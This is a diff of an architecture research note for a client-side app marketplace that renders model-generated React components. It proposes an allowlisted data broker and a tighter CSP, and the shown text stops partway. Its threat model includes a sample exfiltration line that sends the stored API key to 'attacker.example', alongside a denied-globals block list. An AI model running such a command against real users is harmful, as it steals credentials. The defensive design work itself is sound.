@@ -1,426 +1,263 @@
-# Architecture Research
+# Architecture Research — v1.1 "Real & Robust"
 
-**Domain:** Client-side generative-UI app marketplace (no-build, in-browser React runtime that produces, compiles, caches, and renders LLM-authored components on demand)
-**Researched:** 2026-06-24
-**Confidence:** HIGH for the runtime/React/Babel mechanics (verified against current React + Babel + Anthropic docs); MEDIUM for build-order and devtools-hygiene trade-offs (reasoned from blueprint + verified constraints, not externally benchmarked)
+**Domain:** Client-only generative app marketplace (browser SPA, no server) — integrating four NEW features into an EXISTING architecture
+**Researched:** 2026-06-25
+**Confidence:** HIGH (every integration point cites a read file; the two keyless data endpoints are verified live)
 
----
-
-## Executive Verdict
-
-The blueprint's layered pipeline (Intent → Registry → Generation → Execution → UI Surface → optional Handlers) is **sound and buildable as described**, with five refinements that are load-bearing and should be locked before phase 1:
-
-1. **Classic JSX runtime is mandatory, not optional.** `new Function()` instantiation only works because classic-runtime Babel emits `React.createElement(...)`, which resolves to the injected `React` arg. Automatic runtime emits `import { jsx } from "react/jsx-runtime"` — an unresolvable import inside `new Function()`. This single config choice is what makes the whole scope-injection model work.
-2. **The mounted-roots map stores roots and re-renders them; it does not create a new root per tweak.** `createRoot()` must run **once per container lifetime**; in-place tweaks call `root.render()` on the stored root; removal calls `root.unmount()`. Calling `createRoot` twice on a live container is a React-warned error.
-3. **Single React instance is the safety property that makes hooks work** across all generated components — and it is satisfied for free because nothing imports React except the host. This must be *protected*, not engineered: never let a second React load.
-4. **`useWidget` synchronicity is achieved entirely by pre-warm**, and pre-warm must be a *transitive* resolve (a widget can itself declare `@widget` deps) feeding a single in-memory `Map` that `useWidget` reads with zero async.
-5. **Devtools hygiene forces concrete structural choices** — opaque keys, a host-call boundary that must carry the (visible) `anthropic-dangerous-direct-browser-access` header, neutral module/store/CSS naming, and a single gated logger — that are cheaper to bake in at phase 0 than to retrofit.
+> This document is a **milestone integration architecture**, not a greenfield survey. It studies the real v1.0/v1.1 code and proposes, for each of the four target features: integration points (real files), new-vs-modified components, data-flow changes, and a dependency-aware build order. The hard problem — a sanctioned network-data path that does not break the CSP/key-exfiltration posture — is addressed first and in depth.
 
 ---
 
-## Standard Architecture
+## Standard Architecture (as built — the substrate we extend)
 
 ### System Overview
 
 ```
 ┌──────────────────────────────────────────────────────────────────────┐
-│  L0  USER INTERACTION SURFACE  (Marketplace shell, AppBar, ⋮ popover)  │
-│  ┌────────────┐  ┌──────────┐  ┌──────────────┐  ┌─────────────────┐   │
-│  │Marketplace │  │ AppShell │  │ WidgetShell  │  │ ContextualPrompt│   │
-│  │   (grid)   │  │  (⋮ app) │  │  (⋮ widget)  │  │   (shared)      │   │
-│  └─────┬──────┘  └────┬─────┘  └──────┬───────┘  └────────┬────────┘   │
-│        │              │               │                   │            │
-├────────┴──────────────┴───────────────┴───────────────────┴───────────┤
-│  L1  INTENT RESOLVER     resolver · classifier · prompt-router         │
-│        action ─────────────────► Intent{op,kind,type,cacheKey,context} │
-├────────────────────────────────────┬───────────────────────────────────┤
-│  L2  REGISTRY (async boundary)      │  L4  EXECUTION ENGINE (sync core) │
-│  ┌──────────────────────────────┐   │  ┌────────────────────────────┐  │
-│  │ IndexedDB  MarketplaceDB v1  │   │  │ transpile (Babel, classic) │  │
-│  │  ┌──────┐┌───────┐┌────────┐ │   │  │ instantiate (new Function) │  │
-│  │  │ apps ││widgets││handlers│ │   │  │ mount (createRoot map)     │  │
-│  │  └──────┘└───────┘└────────┘ │   │  │ useWidget (sync, prewarmed)│  │
-│  └──────────────────────────────┘   │  │ ErrorBoundary (per shell)  │  │
-│  in-mem: registryCache + transpiledCache  └────────────────────────────┘ │
-├────────────────────────────────────┴───────────────────────────────────┤
-│  L3  GENERATION   buildPrompt · callModel(host) · selfHeal · clean      │
-│        cache MISS ─► host fetch ─► raw JSX ─► clean ─► transpile ─► store│
-├──────────────────────────────────────────────────────────────────────────┤
-│  L6  HANDLERS (optional)   runHandler(intent,input) → cached/produced fn │
-└──────────────────────────────────────────────────────────────────────────┘
-                          │ (only outbound network edge)
-                          ▼
-                  api.anthropic.com /v1/messages   (Haiku, user key)
+│  UI LAYER  (src/ui/)                                                   │
+│  Marketplace ─ AppShell ─ WidgetShell ─ ContextualPrompt ─ KeyDialog   │
+│      │ handleOpen / handleModify                                       │
+├──────┼────────────────────────────────────────────────────────────────┤
+│  INTENT  (src/intent/)         resolveOpenApp → Intent{cacheKey}       │
+│      │                          routeModification → remove/clone/tweak │
+├──────┼────────────────────────────────────────────────────────────────┤
+│  EXECUTION  (src/execution/)                                          │
+│   loader.ts  ── 3-tier resolve (live → session → registry → produce)  │
+│      ├─ instantiateApp(mode)                                          │
+│      │     ├─ "app"        → instantiateWithWidgets → instantiate()   │
+│      │     └─ "delegated"  → instantiateDelegated → DelegatedShell    │
+│      ├─ prewarmWidgets ── widgetParse (@widget) ── produceComponent   │
+│      └─ runHandler ── resolve-or-produce-then-exec (constrained scope)│
+│   producer.ts ── buildPrompt(kind) → callModel → extractCode →        │
+│                  transpile → self-heal(≤3)                            │
+├──────────────────────────────────────────────────────────────────────┤
+│  HOST  (src/host/)   modelClient (SINGLE egress) ─ resilientTransport  │
+│                      tokenBucket ─ backoff ─ produceGate ─ storage     │
+├──────────────────────────────────────────────────────────────────────┤
+│  SERVICES (src/services/)  IoC bundle: { transport, registry,         │
+│                            getApiKey, produceGate, storage }          │
+├──────────────────────────────────────────────────────────────────────┤
+│  REGISTRY (src/registry/)  cacheKey(registryKey folds kind+type+prompt)│
+│   IndexedDB "MarketplaceRegistry" v2 → stores: apps │ widgets │ handlers│
+└──────────────────────────────────────────────────────────────────────┘
+        ▲ generated code runs in new Function() with fetch/XHR/window/
+        │ document/localStorage SHADOWED to undefined (containment-by-convention)
+   CSP: connect-src 'self' https://api.anthropic.com   (key-exfil mitigation)
 ```
 
-### Component Responsibilities
+### Component Responsibilities (touch-point map for v1.1)
 
-| Component | Owns | Talks to | Notes |
-|-----------|------|----------|-------|
-| **Marketplace / AppBar** (L0) | Storefront grid, open-app lifecycle, API-key + theme config | Intent Resolver, mount map | The only place that holds the list of "open apps" |
-| **AppShell / WidgetShell** (L0) | One framed instance + its `⋮`, hosts the ErrorBoundary, owns the container `<div>` | Execution Engine (mount), ContextualPrompt | Shell owns the DOM node passed to `createRoot` |
-| **ContextualPrompt** (L0) | Free-text capture, routes to remove/clone/mutate | Prompt Router (L1) | Shared by app + widget; target passed in |
-| **Intent Resolver** (L1) | action → `Intent`, cacheKey derivation, prompt normalization | Registry (L2) | Pure/cheap; classifier's Haiku fallback is the one async path here |
-| **Prompt Router** (L1) | Keyword routing: remove/clone client-side, else mutate | Registry, Generation | remove + clone never call the model |
-| **Registry** (L2) | IndexedDB CRUD, opaque keys, schema/version, in-mem caches | Execution, Generation | The async boundary; everything below it is sync |
-| **Generation** (L3) | Prompt assembly, host model call, clean, transpile-on-miss, self-heal, `@widget` dep parse | Registry (store), Execution (transpile) | Only component that touches the network |
-| **Execution Engine** (L4) | transpile → instantiate → mount, `useWidget` factory, mounted-roots map, ErrorBoundary | Registry (read caches), DOM | Synchronous core; never awaits during render |
-| **Handlers** (L6) | `runHandler` resolve-or-produce-then-exec for data ops | Registry, Generation | Transparent to apps/widgets |
-| **Host Boundary** (cross-cutting) | The single `fetch` to `api.anthropic.com`, header assembly, gated logger | Generation, Classifier | Isolating this one function localizes every network-hygiene rule |
-
-**The two boundaries that define the system:**
-- **Async/sync boundary** sits at the top of L4. Everything above (resolve, registry read, generation, pre-warm) is async and `await`-heavy. Everything inside a React render (instantiate, `useWidget`, mount) is synchronous. *No `await` may cross into a render cycle.*
-- **Network boundary** is a single host-call function. It is the only outbound edge, and therefore the only place that must satisfy network-tab hygiene.
+| Component | Owns | File |
+|-----------|------|------|
+| `resolveComponent` | 3-tier resolve → produce → cache → instantiate-by-mode | `src/execution/loader.ts:173` |
+| `instantiateApp` | dispatch `mode: "app"｜"delegated"` | `src/execution/loader.ts:129` |
+| `DelegatedShell` | state SSOT, container click-delegate, merge step | `src/execution/delegated.tsx:162` |
+| `buildActionIntent` | stable per-`(appType, action)` intent (embeds actionSpec) | `src/execution/delegated.tsx:135` |
+| `runHandler` | resolve-or-produce-then-exec; constrained scope (`DENIED_GLOBALS`) | `src/execution/handler.ts:249` |
+| `executeHandler` | `new Function(...DENIED_GLOBALS, "input", body)` exec | `src/execution/handler.ts:100` |
+| `produceComponent` | prompt → extract → transpile → self-heal, by `ProduceKind` | `src/execution/producer.ts:391` |
+| `buildPrompt` | per-kind prompt text (`app/widget/handler/shell/delegated`) | `src/execution/producer.ts:87` |
+| `prewarmWidgets` | transitive `@widget` resolve (cycle-guard, ≤2 concurrency) | `src/execution/widgetPrewarm.ts:187` |
+| `registryKey` | `SHA-256(kind ␟ type ␟ prompt)` — already folds all three | `src/registry/cacheKey.ts:51` |
+| `AppRecord / WidgetRecord / HandlerRecord` | store schemas (latter two are `Record<string,unknown>` stubs) | `src/registry/db.ts:30-38` |
+| `Services` | IoC seam — the ONLY place a new dependency (e.g. `fetchData`) is wired | `src/services/services.ts:30` |
+| `Marketplace` | storefront grid, `handleOpen`, popularity row touch point | `src/ui/Marketplace.tsx:131` |
+| `APP_REGISTRY` | static storefront catalog (`displayName`/`description`/`icon`) | `src/data/appRegistry.ts:11` |
+| CSP `<meta>` | `connect-src 'self' https://api.anthropic.com` | `index.html:13-16` |
 
 ---
 
-## Recommended Project Structure
+## Feature A — Sanctioned network-data path  (THE HARD ONE)
 
-The blueprint's structure is good. The refinements below add the three modules the blueprint implies but does not name as files, and rename for the async/sync and network boundaries.
+### The constraint collision, stated head-on
+
+Three invariants currently make live data **impossible** inside a generated app, by design:
+
+1. **Handler scope shadows the network.** `executeHandler` builds `new Function("module","exports","require", ...DENIED_GLOBALS, "input", body)` where `DENIED_GLOBALS = [fetch, XMLHttpRequest, localStorage, sessionStorage, indexedDB, window, document]` (`handler.ts:69-77`). Inside the body those names resolve to `undefined` parameters. A handler **literally cannot call `fetch`** — Weather/Currency degrade to fabricated fallback data.
+2. **`require` is hostile.** The handler's `requireShim` throws on every specifier (`handler.ts:109`), and the producer rejects any handler whose transpiled output contains `require(` (`producer.ts:471`). No SDK escape hatch exists.
+3. **CSP pins egress.** `connect-src 'self' https://api.anthropic.com` (`index.html:15`). This is **the key-exfiltration mitigation**: the user's Anthropic key lives in `localStorage`; if generated code could reach `window`/`fetch` AND CSP allowed arbitrary `connect-src`, a hallucinated/hostile component could `fetch('https://attacker.example', { body: localStorage.getItem('marketplace.apiKey') })`. The narrow `connect-src` is the last line of defense even though `new Function` is only containment-by-convention.
+
+**Naively "just let handlers fetch" detonates all three** — it un-shadows the network in untrusted scope AND forces `connect-src` open. That is the wrong move.
+
+### Recommended design: HOST-BROKERED, ALLOWLISTED `fetchData(sourceId, params)`
+
+The host (trusted code), not the generated code, performs the network call against a **curated allowlist of keyless, CORS-friendly endpoints**. The generated code only ever names a *source id* and *params*; it never sees a URL, a header, `fetch`, or the Anthropic key.
 
 ```
-src/
-├── host/
-│   └── modelClient.ts        # THE single fetch() to api.anthropic.com; header
-│                             #   assembly incl. anthropic-dangerous-direct-
-│                             #   browser-access; gated logger lives here
-├── db/
-│   ├── index.ts              # openDB(), version+upgrade, typed get/put/delete
-│   ├── apps.ts               # apps store CRUD
-│   ├── widgets.ts            # widgets store CRUD
-│   └── handlers.ts           # handlers store CRUD
-├── registry/
-│   ├── cacheKey.ts           # opaque stable key (normalize → hash)
-│   ├── registry.ts           # resolve(): registryCache → IndexedDB → generate
-│   └── caches.ts             # in-mem Map registries: components + transpiledJS
-├── intent/
-│   ├── resolver.ts           # action → Intent (app + widget aware)
-│   ├── classifier.ts         # static map + Haiku fallback (cached)
-│   └── router.ts             # remove/clone/mutate keyword routing
-├── generation/
-│   ├── app.ts                # buildAppPrompt(), parseWidgetDeps()
-│   ├── widget.ts             # buildWidgetPrompt()
-│   ├── handler.ts            # handler generation
-│   ├── transpile.ts          # Babel wrapper (CLASSIC runtime) + in-mem cache
-│   └── selfHeal.ts           # retry loop, BABEL error fed back
-├── execution/
-│   ├── instantiate.ts        # new Function() → React component (scope-injected)
-│   ├── mount.ts              # mounted-roots Map; createRoot once, render/unmount
-│   ├── useWidget.ts          # sync hook factory, reads pre-warmed component Map
-│   ├── prewarm.ts            # transitive @widget resolve before mount
-│   └── ErrorBoundary.tsx     # per-shell isolation boundary
-├── ui/
-│   ├── Marketplace.tsx · AppShell.tsx · WidgetShell.tsx
-│   ├── ContextualPrompt.tsx · AppBar.tsx
-├── store/
-│   ├── apiKey.ts · theme.ts  # localStorage (neutral keys)
-└── app.tsx                   # root: eager Babel load, DB init, theme init, shell
+GENERATED (untrusted)                HOST (trusted)                    NETWORK
+─────────────────────                ──────────────                    ───────
+handler body / view spec             fetchData(sourceId, params)
+   await fetchData("weather",  ───▶  1. look up DATA_SOURCES[sourceId]  (manifest)
+        { lat, lon })                2. validate params (schema)
+                                     3. build URL from TEMPLATE only ──▶ api.open-meteo.com
+                                        (no caller-supplied origin)        (keyless, CORS)
+                                     4. fetch() here, in host scope   ◀── JSON
+   ◀── { data } | { error }   ◀──    5. shape + return plain data
 ```
 
-### Structure Rationale
+**Why this is safe on all three axes:**
 
-- **`host/modelClient.ts` is new and deliberate.** Collapsing every model call into one function makes the network-hygiene rule a one-file invariant (header set once, prompt is the only body, logger gated here) and gives self-heal/classifier a single seam to call.
-- **`registry/` is split out from `db/`.** `db/` is raw IndexedDB; `registry/` is the resolve-or-produce policy plus the two in-memory caches. This keeps the "compile-once / read-sync" caches next to the lookup logic that populates them, away from storage plumbing.
-- **`execution/prewarm.ts` is named explicitly** because pre-warm is the mechanism that makes `useWidget` synchronous — it deserves to be a first-class, testable unit, not a method buried in AppShell.
-- **`execution/` is the synchronous island.** Everything in it must be callable from inside a render with no `await`. Keeping it physically separate from `generation/` (which is all async) enforces the boundary by directory.
+- **The Anthropic key never enters app scope.** `fetchData` is a host closure (like `runHandler` is today — `loader.ts:116`). The key is read only by `getApiKey` inside `modelClient`; `fetchData` closes over a curated manifest, not the key. The generated code is handed a *bound function*, exactly the pattern already proven for `runHandler`.
+- **The URL is host-built from a template, never caller-supplied.** `DATA_SOURCES[sourceId].buildUrl(params)` is the ONLY way a URL is formed. Generated code cannot point the host at `attacker.example` because it never supplies an origin — only a `sourceId` that must exist in the manifest and `params` that are validated/encoded by the host. SSRF-by-prompt is structurally impossible.
+- **CSP widens to an EXPLICIT, finite allowlist — never `*`.** Because every reachable origin is known at build time (it is the manifest's origin set), the CSP becomes:
+  `connect-src 'self' https://api.anthropic.com https://api.open-meteo.com https://api.frankfurter.dev;`
+  This is the crucial property: **we widen `connect-src` to a vetted, enumerable set of keyless data endpoints, NOT to `*`.** A hostile component that *did* break containment still cannot POST the key anywhere — every allowlisted origin is a keyless GET-only public data API that we chose, none of which we authenticate to, so exfiltration to them is inert (they ignore an unknown body; they hold no attacker inbox). The exfiltration surface added is exactly "can leak to two public weather/FX read APIs," which is not a credential sink.
+
+**Verified concrete allowlist (keyless + CORS, browser-direct, June 2026):**
+
+| sourceId | Origin | Keyless? | CORS? | Use |
+|----------|--------|----------|-------|-----|
+| `weather` | `https://api.open-meteo.com` | yes (no key, no signup) | yes (CORS out of the box) | Weather app — forecast by lat/lon |
+| `geocode` | `https://geocoding-api.open-meteo.com` | yes | yes | place-name → lat/lon for Weather |
+| `currency` | `https://api.frankfurter.dev` | yes (84 central banks) | yes | Currency app — live FX rates |
+
+> All three are **GET-only, keyless, CORS-enabled** public read APIs — verified live (sources below). Critically: none require a credential, so adding them to `connect-src` introduces no new credential sink. This is what makes the CSP widening safe rather than reckless.
+
+**Where it hooks in (mechanically):**
+
+1. NEW `src/host/dataSources.ts` — the **manifest**: `Record<sourceId, { origins: string[]; buildUrl(params): string; validate(params): boolean; shape(json): unknown }>`. Pure host code; the single place any external read origin is named (mirroring how `modelClient.ts` is the single Anthropic-egress chokepoint).
+2. NEW `fetchData(sourceId, params): Promise<{ data?, error? }>` in `src/host/dataBroker.ts` — performs the host-side `fetch`, maps failures to a neutral `{ error }` (hygiene parity with `runHandler`). Honors a host timeout + the existing rate posture (can reuse `tokenBucket` semantics or a dedicated lighter limiter; data GETs are cheaper than model calls).
+3. MODIFY `Services` (`services.ts:30`) — add `fetchData: FetchData`. Wire the real impl in `createServices` (`services.ts:88`). Tests inject a canned `fetchData` (no network), preserving the offline-test invariant.
+4. MODIFY the **handler scope** (`handler.ts`): add `fetchData` to the injected params of `executeHandler`, AND **keep `fetch`/`XMLHttpRequest` shadowed** — `fetchData` is the sanctioned replacement; raw `fetch` stays banned. `runHandler` binds `services.fetchData` and passes it positionally (exactly as it could bind `services` today). The hostile `require` and the produce-time `require(` reject stay unchanged.
+5. MODIFY the **delegated path** (`delegated.tsx`): the per-action handler produced via `buildActionIntent` already runs through `runHandler`, so handlers gain `fetchData` for free once (4) lands. For data on *initial* render (Weather shows a forecast before any click), add an optional `data-action` the shell fires once on mount (a "load" action), OR let the produced `actionSpec` declare an init action — keep KISS: a mount-fire of a conventional `init`/`load` action reuses the existing merge step (`delegated.tsx:183`) with zero new merge machinery.
+6. MODIFY `index.html` CSP `connect-src` to the explicit allowlist; MODIFY `src/csp.test.ts` (the existing guard) to assert the exact origin set so the allowlist can't silently drift.
+7. MODIFY the producer prompts (`producer.ts buildPrompt`): teach the `handler` and `delegated` kinds that `fetchData("<sourceId>", params)` is an in-scope global for live data, with the **exact source ids enumerated** and a NO-OP rule (most apps need none) — directly applying the CONSULT-activating-widgets guidance (declaration-as-CoT-anchor, helpers-as-globals, mandatory negative constraints). Hygiene: phrasing avoids the banned lexicon.
+
+**Self-heal note:** a `fetchData` to an unknown `sourceId` returns `{ error }` (not a throw), so a hallucinated source id degrades to the existing keep-prior-state path — never a crash, never a mechanic leak.
+
+### Alternatives considered (and why brokered allowlist wins)
+
+| Approach | How it works | Verdict |
+|----------|--------------|---------|
+| **Host-brokered `fetchData` + allowlist** (RECOMMENDED) | Host fetches against curated keyless origins; URL host-built; key never in app scope; CSP → explicit finite allowlist | **Chosen.** Key-safe, SSRF-safe, CSP stays enumerable, reuses the `runHandler`-style bound-closure pattern already in the codebase. |
+| **Per-app declared data-source manifest** (app declares `// @source weather` like `@widget`) | Producer emits a source declaration; host pre-validates declared sources before mount | **Adopt as a COMPLEMENT, not a substitute.** Good for CSP pre-flight/telemetry and for priming the model (CoT anchor). But it does not itself perform the fetch safely — it still needs the brokered executor. Use the `@source` parse only to *gate which sourceIds an app may call*; the broker remains the trust boundary. Lower priority than the broker itself. |
+| **`postMessage` to host** | Generated code runs in an iframe; posts data requests to parent which brokers the fetch | **Right end-state, wrong milestone.** This is the HARD-01 iframe model (deferred to v2). It is strictly *more* isolating than `fetchData` (opaque origin → no `localStorage` access at all), but it requires shipping React into the frame, re-injecting theming per frame, and a message protocol. Build `fetchData` now behind a seam so swapping to a postMessage-brokered `fetchData` later is contained. |
+| **Keep raw `fetch` banned forever (status quo)** | Network apps fabricate fallback data | **Reject for v1.1** (it is the explicit gap this milestone closes) but **keep raw `fetch` itself banned forever** — the broker is the sanctioned path; un-shadowing raw `fetch` is never on the table. |
+
+**The CSP/key-exfiltration tradeoff, explicitly:** we accept widening `connect-src` from `{self, anthropic}` to `{self, anthropic, open-meteo, frankfurter, open-meteo-geocode}`. The risk delta is "generated code could leak data to three public keyless read APIs we picked." Since none authenticate us, none is a credential sink, and the Anthropic key never leaves `localStorage`/`modelClient`, the *exfiltration value* of the new origins is ~zero. We explicitly do **not** widen to `*`, do **not** allow caller-supplied origins, and do **not** un-shadow raw `fetch`. The broker pattern converts "arbitrary egress" into "three enumerable inert GET sinks" — a strict, auditable improvement over any scheme that hands the network to generated code.
 
 ---
 
-## Architectural Patterns
+## Feature B — Reliability hardening (delegated state/actionSpec correctness)
 
-### Pattern 1: Resolve-or-Produce (one engine for apps, widgets, handlers)
+The delegated loop already has the right SSOT shape (shell owns state, intent embeds `actionSpec`, merge keeps-prior on failure). The reliability gap is that **a produced handler can return a wrong-shaped or partial state and the merge accepts it blindly**: `setState(prev => ({ ...prev, ...next }))` (`delegated.tsx:182-184`) merges any object, including one with hallucinated keys (`display` vs `value`) or coerced types — exactly the drift the CONSULT flagged.
 
-**What:** A single `resolve(intent)` function: check in-mem registry → check IndexedDB → on miss, generate + store. Apps, widgets, and handlers differ only by store name and prompt template.
+**Three hook points (build cheapest-first):**
 
-**When:** Every meaningful action and every dependency edge.
+| Hook | Where | What | Cost |
+|------|-------|------|------|
+| **1. Validate at the merge step** (RECOMMENDED first) | `DelegatedShell.onClick`, `delegated.tsx:182-184` | Before merging, validate `next` against the **key set + value types of `module.initialState`** (the SSOT shape is already in hand). Reject/keep-prior on extra keys or type mismatch; merge only known keys. | Low — pure, no model call, no schema language. The initialState IS the schema. |
+| **2. Stronger actionSpec contract the producer enforces** | `producer.ts buildPrompt("delegated")` + `instantiateDelegated` (`delegated.tsx:59`) | Require the delegated module to export a machine-checkable shape (the `initialState` is already canonical; optionally a typed field list). Enforce at instantiate: reject a module whose `view` reads keys absent from `initialState`. | Medium — tightens the contract; some can be a lint-style check on the source. |
+| **3. Self-heal on a bad transition** | `DelegatedShell` + `runHandler` | When validation (hook 1) rejects a returned state, optionally re-issue the action intent once with the validation error appended (mirroring the producer's compiler-error self-heal at `producer.ts:499`), then keep-prior if it still fails. | Higher — adds a model round-trip on the interaction hot path; gate behind a single retry and the produceGate so it can't storm. |
 
-**Trade-offs:** One mental model and one tested path (huge for a small team); cost is that the three slightly different schemas share a code path and need care to not over-couple (handlers have no `transpiledJS`, only `sourceCode`).
+**Recommendation:** ship hook 1 (merge-step validation against `initialState`) as the backbone — it is cheap, pure, testable offline, and converts "silent drift" into "deterministic keep-prior." Layer hook 3 (one self-heal retry) only if real-Haiku fixtures show frequent recoverable drift. Hook 2 is a producer-prompt tightening that rides along with the prompt edits already needed for Feature A.
 
-```typescript
-async function resolve(intent: Intent): Promise<Resolved> {
-  const hit = registryCache.get(intent.cacheKey);      // in-mem, sync
-  if (hit) return hit;
-  const stored = await db.get(storeFor(intent.kind), intent.cacheKey);
-  if (stored) return hydrate(stored);                  // populates caches
-  const produced = await generate(intent);             // model + transpile + store
-  return produced;
-}
-```
-
-### Pattern 2: Classic-runtime transpile + named-scope instantiation
-
-**What:** Babel `preset react` (classic runtime → `React.createElement`) produces a CommonJS-shaped string; `new Function("module","exports","React", ...extras, code)` runs it and returns `module.exports.default`.
-
-**When to use:** Every instantiation. This is the core trick of the whole system.
-
-**Trade-offs:** Classic runtime is required so the only free identifier the code needs is `React` (which we inject). The price: generated code must never `import`/`require` anything; the prompt enforces "no imports other than React" and the scope provides no resolver, so a stray import throws at instantiation (caught by self-heal or ErrorBoundary). **Lock the Babel config to classic runtime explicitly — do not rely on the default, which flips to automatic in Babel 8.**
-
-```typescript
-// transpile.ts — pin runtime so a Babel major bump can't break instantiation
-Babel.transform(sourceJSX, {
-  presets: [["react", { runtime: "classic" }]],
-  filename: "component.jsx",
-}).code;
-
-// instantiate.ts
-const argNames  = ["module", "exports", "React", ...Object.keys(extras)];
-const argValues = [mod, mod.exports, React, ...Object.values(extras)];
-new Function(...argNames, code)(...argValues);
-return mod.exports.default ?? mod.exports;
-```
-
-### Pattern 3: Single shared React via reference injection (no globals)
-
-**What:** Hooks require that the `React` a component uses is the *same module object* as the one whose dispatcher is active during render. Passing the host's imported `React` as a `new Function()` argument satisfies this by identity — no `window.React`, no global pollution.
-
-**When:** Always. It is the safety property behind every generated hook.
-
-**Trade-offs:** Free and clean *as long as exactly one React copy exists in the page*. The risk is not "how do I share it" but "how do I avoid a second one." Concretely: do not load React from a second `<script>`/CDN, do not let a generated app import React (the prompt forbids it and the scope can't resolve it anyway), and dedupe React/react-dom in the bundle. A second instance manifests as the "Invalid hook call / dispatcher is null" failure, isolated to that widget by its ErrorBoundary but confusing to debug — so make "one React, injected by reference" an explicit invariant in code comments (written neutrally, per hygiene).
-
-```typescript
-import * as React from "react";   // the one and only instance
-// ...passed by reference into every generated component's scope
-makeUseWidget(appId);             // closure also closes over the same React
-```
-
-### Pattern 4: Transitive pre-warm → synchronous `useWidget`
-
-**What:** Before mounting an app, parse its `@widget` declarations, resolve each (cache or produce), and — because a widget may itself declare `@widget` deps — recurse until the dependency closure is fully in the in-memory component `Map`. Only then mount. `useWidget(type)` is a pure `Map.get` returning the component synchronously.
-
-**When to use:** Every app mount and every widget mount that has its own deps.
-
-**Trade-offs:** Eliminates render waterfalls and keeps `useWidget` sync (the blueprint's hard requirement). Cost: pre-warm is a serial-or-parallel async phase before first paint; parallelize sibling resolves (`Promise.all`) and guard against cycles with a visited-set. A widget requested *dynamically* (not declared) legitimately can't be pre-warmed — for that case `useWidget` returns a neutral skeleton and kicks off background resolution + re-render, which is acceptable as a documented fallback, not the main path.
-
-```typescript
-async function prewarm(deps: string[], seen = new Set<string>()) {
-  await Promise.all(deps.map(async (type) => {
-    if (seen.has(type)) return;
-    seen.add(type);
-    const w = await resolve(widgetIntent(type));   // cache or produce
-    componentMap.set(componentKey("widget", type), instantiate(w.transpiledJS, { /* React only */ }));
-    if (w.widgetDeps?.length) await prewarm(w.widgetDeps, seen);  // transitive
-  }));
-}
-// useWidget — synchronous, render-safe
-const useWidget = (type) => componentMap.get(componentKey("widget", type)) ?? Skeleton;
-```
-
-### Pattern 5: Mounted-roots map — create once, render-to-update, unmount-to-remove
-
-**What:** `Map<containerId, Root>`. First mount: `createRoot(container)`, store, `root.render(tree)`. In-place tweak: look up the existing root, call `root.render(newTree)` — **do not** create a new root. Removal: `root.unmount()` then drop the map entry (and only then remove the DOM node).
-
-**When to use:** Every mount, every tweak, every removal.
-
-**Trade-offs:** Matches React's contract (calling `createRoot` twice on a live container is a warned error and double-manages reconciliation). The discipline cost is real: tweak-in-place must reuse the root, and removal must unmount before DOM detach to avoid leaks/zombie roots. Keying the map by the stable instance id (not cacheKey — two instances of the same app type can coexist) is essential.
-
-```typescript
-const roots = new Map<string, Root>();
-function mountInstance(id: string, container: HTMLElement, tree: ReactNode) {
-  let root = roots.get(id);
-  if (!root) { root = ReactDOM.createRoot(container); roots.set(id, root); }
-  root.render(<ErrorBoundary>{tree}</ErrorBoundary>);   // re-render reuses root
-}
-function unmountInstance(id: string) {
-  roots.get(id)?.unmount();
-  roots.delete(id);
-}
-```
-
-### Pattern 6: Layered cache (component Map ▸ transpiled Map ▸ IndexedDB ▸ model)
-
-**What:** Three read tiers in front of the model. Tier 0: instantiated-component `Map` (skips even `new Function()`). Tier 1: `transpiledJS` `Map` (skips Babel). Tier 2: IndexedDB (`sourceJSX` + `transpiledJS`, survives reload). Tier 3: model call (last resort).
-
-**When to use:** Every resolve.
-
-**Trade-offs:** Guarantees "compile once per session" and "never re-run Babel from storage twice." Cost: cache-key discipline must be airtight — same type + normalized prompt → same key, or you silently duplicate. Storage rule: **never persist the instantiated function** (not serializable); persist the `transpiledJS` string and re-instantiate on load. The component `Map` is the only tier holding live functions and it is session-scoped.
+**New vs modified:** NEW `src/execution/stateContract.ts` (pure `validateTransition(initialState, next): { ok; merged }`). MODIFIED: `delegated.tsx` merge step calls it; optionally `producer.ts` delegated prompt; optionally one retry path in `DelegatedShell`. No registry/schema changes.
 
 ---
 
-## Data Flow
+## Feature C — Richer storefront (G5 displayName/prompt + POP-01 popularity row)
 
-### Request Flow (cache miss, app with widget deps)
+This is the lowest-risk feature and a clean schema extension.
 
-```
-open app
-   ↓
-Intent Resolver ─► Intent{ op:render, kind:app, type, cacheKey, context }
-   ↓
-registryCache.get → MISS
-   ↓
-db.get("apps", cacheKey) → MISS
-   ↓
-Generation: buildAppPrompt → host.modelClient(prompt) ─► raw JSX
-   ↓                                  │ (only network edge)
-clean → transpile(classic) → self-heal if Babel error (≤3, Babel err fed back)
-   ↓
-store {sourceJSX, transpiledJS, widgetDeps} → apps; populate transpiledCache
-   ↓
-parseWidgetDeps → prewarm(deps)  ⟳ transitive, fills componentMap   [async]
-   ════════════════ async/sync boundary ════════════════
-   ↓
-instantiate(transpiledJS, { React, useWidget:makeUseWidget(appId) })  [sync]
-   ↓
-mount: createRoot(container) once → root.render(<ErrorBoundary><App/></ErrorBoundary>)
-   ↓
-App renders → useWidget("line-chart") → componentMap.get → <Widget/> (sync)
-   ↓
-UI Surface: AppShell frame + ⋮  (widget in own WidgetShell + own ErrorBoundary)
-```
+**Data-flow change (persist on produce/write):**
 
-### Mutation / tweak Flow (in-place)
+| Field | Today | v1.1 |
+|-------|-------|------|
+| `displayName` | only in static `APP_REGISTRY` | also persisted on `AppRecord` so produced/tweaked variants keep a faithful label |
+| `prompt` | dropped (key folds it, but the text isn't stored) | persisted on `AppRecord` for faithful re-produce + storefront copy |
+| `description` | only in `APP_REGISTRY` | optionally persisted for produced apps |
+| `useCount` | **already persisted** (`db.ts:20`, bumped on every hit in `loader.touchRecord` and `handler.touchHandler`) | **drives the popular row — no new write needed** |
 
-```
-⋮ → ContextualPrompt → router.route(text, target)
-   ├─ /remove|delete|close/  → unmountInstance(id) → drop DOM        (no model)
-   ├─ /clone|duplicate|copy/ → new id, same cacheKey, mount again    (no model)
-   └─ else (mutate)          → newCacheKey(kind,type,mutationPrompt)
-                                → resolve (cache or produce)
-                                → roots.get(id).render(newTree)   ← reuse root
-```
+**Integration points:**
 
-### State Management
